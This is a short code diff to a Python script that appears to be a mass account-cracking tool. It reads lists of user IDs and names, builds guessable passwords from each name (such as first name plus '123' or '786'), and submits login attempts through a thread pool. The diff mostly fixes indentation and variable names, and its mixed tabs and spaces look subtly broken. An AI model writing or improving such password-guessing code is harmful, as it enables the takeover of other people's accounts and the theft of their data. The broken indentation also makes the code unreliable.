@@ -305,7 +305,7 @@ def menu():
 				exit(' Option not found in menu...')
 
 def useragent():
-                passlist = []
+		passlist = []
                 if not os.path.exists('device_info.txt'):
                         os.system('clear')
                         print(logo)
@@ -687,6 +687,7 @@ def gmail():
                 print(' Total account : \033[1;32m'+tl)
                 print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                 linex()
+		zee = zew
                 for user in fo:
                         ids,names = user.split('|')
                         first_name = names.rsplit(' ')[0]
@@ -697,9 +698,9 @@ def gmail():
                         fs = first_name.lower()
                         ls = last_name.lower()
                         passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-			elif zew in ['1','01']:
+			if zee in ['1','01']:
 				yaari.submit(m1,ids,passlist)
-			elif zew in ['2','02']:
+			elif zee in ['2','02']:
 				yaari.submit(m2,ids,passlist)
 			else:
 				yaari.submit(m1,ids,passlist)
